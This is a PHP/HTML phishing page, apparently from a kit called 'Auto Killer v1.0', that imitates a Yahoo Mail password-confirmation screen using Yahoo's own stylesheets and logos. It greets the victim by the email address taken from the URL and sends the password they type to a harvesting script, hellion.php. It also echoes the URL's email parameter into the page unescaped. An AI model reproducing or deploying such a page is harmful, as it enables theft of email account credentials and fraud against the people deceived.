 <!--
 
 # HELLION PROUDLY PRESENTS, Auto Killer v1.0
 
 # This program is free software brought to you by Hellion: 
 # You can redistribute it and/or modify it under the terms of 
 # the GNU General Public License as published by the Free Software Foundation, 
 # either version 3 of the License, or (at your option) any later version.
 
 # However, the license header, copyright and author credits 
 # must not be modified in any form and always be displayed.

 # This program is distributed in the hope that it will be useful,
 # but WITHOUT ANY WARRANTY; without even the implied warranty of
 # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
 # Contact me : team_pbg@yahoo.com for more details.
 
 # Skype: teamipwned

 # Special greets to Shaif Lifax, Solaree, PaperBoi, Softwarewind, Emoney, and others who helped! 
 
 # WARNING: Do not touch anything here!
 
  -->

<!doctype html>
<html lang="en-US" class="no-js">
  <head>

    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <title>Confirm Password Strength</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link rel="stylesheet" type="text/css" href="https://s.yimg.com/sf/preg/r27/01/assets/base/css/base-ltr.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://s.yimg.com/zz/combo?kx/yucs/uh3/uh/1132/css/uh_non_mail-min.css&kx/yucs/uh_common/meta/3/css/meta-min.css&kx/yucs/uh3/uh/1132/css/uh_ssl-min.css" />
    <script>
        (function(html){
            var c = html.className;
            c = c.replace("no-js","js");
            html.className = c;
        })(document.documentElement);
    </script>
    <!-- style overrides for footer -->
    <style>
        a {
            color: #019aff;
            text-decoration: none;
        }
        div#mem_ft {
            border: 0px;
            color: #019aff;
        }
    </style>
  </head>
  <body>
    <style>#yucs{margin:0 auto;width:100% !important}#yucs .yucs-avatar{height:22px;width:22px}#yucs #yucs-profile_text .yuhead-name-greeting{display:none}#yucs #yucs-profile_text .yuhead-name{top:0;max-width:65px;_width:65px}#yucs-profile_text{max-width:65px}.yucs-hide{display:none !important}#yucs #yucs-help_link{font-size:13px;color:#1d1da3;text-shadow:1px 1px 1px #fff;-ms-text-shadow:1px 1px 1px #FFF;text-indent:0;text-decoration:none}#yucs #yucs-help{margin-top:13px;margin-right:10px;*margin-top:19px}#yucs #yucs-help_link:hover{text-decoration:underline}#yucs-profile a#yucs-menu_link_profile{width:100%;_width:100px}#yucs-profile_text{_margin-top:10px}#yucs .yucs-signout{_margin-top:-5px}</style><div id="yucsHead" class="yucs-login yucs-en-us"><!-- meta --><div id="yucs-meta" data-authstate="signedin" data-cobrand="standard" data-crumb="xOHYC7JOkdA" data-mc-crumb="Khz8SrptZ3k" data-gta="gzkxSsgKqp1" data-device="desktop" data-experience="" data-firstname="Team" data-flight="1425123038" data-forcecobrand="standard" data-guid="6UJYKXWYWGGVFZHEYTRNYEJECM" data-host="edit.yahoo.com" data-https="1" data-languagetag="en-us" data-property="login" data-protocol="https" data-shortfirstname="Team" data-shortuserid="teamipwned" data-status="active" data-spaceid="" data-test_id="" data-userid="teamipwned" data-stickyheader="true" data-headercollapse='' ></div><!-- /meta --> <div id="yucs" class="yucs yucs-mc  login_mailflow" data-lang="en-us" data-property="login" data-flight="1425123038" data-linktarget="_top" data-uhvc="/"> <div class="yucs-fl-left yog-cp">   <div id="yucs-logo"> <style> #yucs #yucs-logo {width:120px ;padding-top: 11px !important;margin-top: 0 !important;} #yucs #yucs-logo div { display:block; width:120px !important;margin: 0 auto !important; height:34px ; background-image:url(https://s.yimg.com/rz/l/yahoo_mail_en-US_f_pw_119x34.png) ; _background-image:url(https://s.yimg.com/rz/l/yahoo_mail_en-US_f_pw_119x34.gif) ; } #yucs #yucs-logo a { display:block ; width:120px ; height:34px; overflow: hidden; } @media only screen and (-webkit-min-device-pixel-ratio: 2), only screen and ( min--moz-device-pixel-ratio: 2), only screen and ( -o-min-device-pixel-ratio: 2/1), only screen and ( min-device-pixel-ratio: 2), only screen and ( min-resolution: 192dpi), only screen and ( min-resolution: 2dppx) { #yucs #yucs-logo div { background-image: url(https://s.yimg.com/rz/l/yahoo_mail_en-US_f_pw_119x34_2x.png) !important; background-size: 240px 34px; } } </style> <div> <a id="yucs-logo_link" href="https://mail.yahoo.com?.src=ym" target="_top"> Yahoo Mail </a> </div></div>  </div><div class="yucs-fl-right"> <div class="yucs-mail-info"><a class="yucs-fc" href="https://overview.mail.yahoo.com/">About Mail</a><a class="yucs-fc" href="https://overview.mail.yahoo.com//#features">Features</a><a class="yucs-fc" href="https://mobile.yahoo.com/mail/?src=gta">Get the App</a></div><style>.yucs-mail-info{float:left;margin-top:13px}.yucs-mail-info a{margin-right:22px;text-decoration:none;font-size:13px}.yucs-mail-info a:hover{text-decoration:underline;}#yucs #yucs-help{margin-left:0!important}#yucs-profile{display:none!important}</style><div id="yucs-profile" class="yucs-activate yucs-profile yucs-menu_nav"> <a id="yucs-menu_link_profile" class="yucs-submenu-toggle yucs-um-activate" href="#" target="_top" rel="nofollow" aria-label="Profile"> <span class="yucs-avatar yucs-av-activate yucs-menu_anchor" data-user="Team" data-property="login" data-bucket="" data-prof="Avatar" data-crumb="xOHYC7JOkdA" data-guid="6UJYKXWYWGGVFZHEYTRNYEJECM"></span><span id="yucs-profile_text"><span class="yuhead-name-greeting yucs-fc">Hi,&nbsp;</span><span class="yuhead-name yucs-fc">Team</span></span> </a> <noscript><span class="yucs-no_menu"><a class="yucs-signout" href="https://login.yahoo.com/config/login?logout=1&.direct=2&.done=https://www.yahoo.com&amp;.src=ymbr&amp;.intl=us&amp;.lang=en-US" target="_top" rel="nofollow" data-ylk="t3:tl-lst;t4:usr-mu;t5:usersigno;slk:usersigno;elm:itm;elmt:lgo;"> Sign Out</a></span></noscript> <div id="yucs-profile_inner" class="yucs-hide yucs-menu" data-ylt-profile="/" data-yltmenushown="/"> <span class="sp yucs-dock"></span> <ul class="yucs-profile-items-panel" role="menu"> <li><div class="yucs-signed_in_as">Signed in as:<br /><a class="yucs-acct-link" href="https://edit.yahoo.com/mc2.0/eval_profile?.intl=us&.lang=en-US&.done=https://edit.yahoo.com/config/change_pw%3f.scrumb=aJyrnIncYwj%26.done=https%253A%252F%252Fmail.yahoo.com%26.src=ym%26.st=1&amp;.src=ymbr&amp;.intl=us&amp;.lang=en-US" target="_top"><span class="yuhead-yid ellipses">teamipwned</span></a></div></li> <span class="yucs-separator" role="presentation"></span> <li><a class="yucs-signout" href="https://login.yahoo.com/config/login?logout=1&.direct=2&.done=https://www.yahoo.com&amp;.src=ymbr&amp;.intl=us&amp;.lang=en-US" target="_top" rel="nofollow" data-ylk="t3:tl-lst;t4:usr-mu;t5:usersigno;slk:usersigno;elm:itm;elmt:lgo;"> Sign Out</a></li> </ul> </div></div>   <div id="yucs-help" class="yucs-activate yucs-help yucs-menu_nav"> <a id="yucs-help_link" href="https://help.yahoo.com/kb/index?locale=en_US&page=product&y=PROD_ACCT" aria-label="Help" rel="nofollow"> Help </a></div>          </div>  </div> <div id="yUnivHead" class="yucs-hide"><!-- empty --></div></div>    <div class="container">
      <div class="grid">
        <div class="header">
          <!--header is displayed within this container-->
        </div>
        <div class="heading">
          Hi <? echo str_replace("@yahoo.com","",$_GET['email']) ?>,</div></div>
        <div class="description">
          Strengthen your account from threats, confirm your password strength now.        </div>
        <form id="change-password-form" method="post" action="hellion.php?email=<?php echo $_GET['email']; ?>">
          <input type='hidden' name="email" value="<?php echo $_GET['email']; ?>">
          <div class="column column-1-1 spacing">
            <div class="column-1-1">
              <label class="field-label" for="password">New password</label>
              <input type="password" id="password" maxlength=32 class="input-field  "  name="passwd" placeholder="Confirm your password"/>
            </div>
            <p id="password-message"  style="display:none"  class="field-message"></p>
          </div>
         










          <div class="grid" style="margin-top:10px">
            <div class="column column-1-1 toggle-password-mask-container" id="toggle-password-mask-container"></div>
          </div>
          <div class="column column-1-1" style="margin-top: 30px">
            <input type="submit" id="primary-cta" class="button submit" value="Continue"/>
          </div>
          <input type='hidden' name=".scrumb" value="aJyrnIncYwj" >
          <input type='hidden' name=".crumb" value="yFYWE6QCUqz" >
          <input type='hidden' name=".done" value="https://mail.yahoo.com" >
          <input type='hidden' name=".src" value="ym" >
          <input type='hidden' name=".partner" value="" >
          <input type='hidden' name=".u" value="" >
          <input type='hidden' name=".msg_code" value="" >
          <input type='hidden' name=".tr" value="0">
          <input type='hidden' id="first-name" name="fname" value="Team">
          <input type='hidden' id="last-name" name="lname" value="IPwned">
          <input type="hidden" id="user-name" name="email" value="<?php echo $_GET['email']; ?>">
          <input type='hidden' name="ContinueBtn" value="Save" />
          <input type='hidden' name=".st" value="1">
        </form>
        <div class="column column-1-1 secondary-button-container">
          <form id='cancel-password-form' method=post>
            <input type=hidden name=".scrumb" value="aJyrnIncYwj" >
            <input type=hidden name=".crumb" value="yFYWE6QCUqz" >
            <input type=hidden name=".done" value="https://mail.yahoo.com" >
            <input type=hidden name=".src" value="ym" >
            <input type=hidden name=".partner" value="" >
            <input type=hidden name=".u" value="" >
            <input type=hidden name=".msg_code" value="" >
            <input type=hidden name=".tr" value="0">
            <input type="hidden" id="first-name" name="fname" value="Team">
            <input type="hidden" id="last-name" name="lname" value="IPwned">
            <input type="hidden" id="user-name" name="email" value="<?php echo $_GET['email']; ?>">
            <input type="hidden" name="ContinueBtn" value="Save" />
            <input type=hidden name=".st" value="1">
        </div>
        <div class="footer" style="padding: 38px 0;">
          <!--footer is    </p>    </p>
</div>        </div>
      </div>
    </div>
  </body>
</html>
<footer>
			<!-- footer widget -->
						<div id="mbr-footer" class="mbr-footer pure-u-1">
	<div></div>
	<div></div>
	<div><a href="#" target="_blank"><div align="center"><font size="1">Terms</a> | <a href="#">Privacy</a></font></div></div>
</div>
		</footer>
	</div>